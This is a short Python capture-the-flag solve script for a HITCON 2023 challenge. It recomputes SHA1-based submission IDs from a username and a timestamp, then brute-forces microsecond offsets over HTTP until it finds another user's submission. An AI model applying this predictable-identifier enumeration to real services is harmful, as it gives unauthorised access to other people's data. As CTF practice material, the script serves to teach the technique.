import hashlib
import requests
from datetime import datetime, timezone

# http://rectf.hitcon2023.online:30203//submission.php?homeworkid=1
username = "flagholder"
timestamp = "2023-08-16 04:09:35.584096"

dt = datetime.fromisoformat(timestamp)
sec = int(dt.timestamp())
usec = dt.microsecond
print(sec, usec)

url = "http://rectf.hitcon2023.online:30203/submission.php?hash="

def get_hash(sec, usec):
    user_id = f"{username}_{sec:08x}{usec:05x}"
    return hashlib.sha1(user_id.encode()).hexdigest()

for i in range(0, 1000):
    hash = get_hash(sec, usec - i)
    r = requests.get(url + hash)
    print(i, hash)
    if r.text != "Submission not found.":
        print("found hash:", hash)
        print(r.text)
        break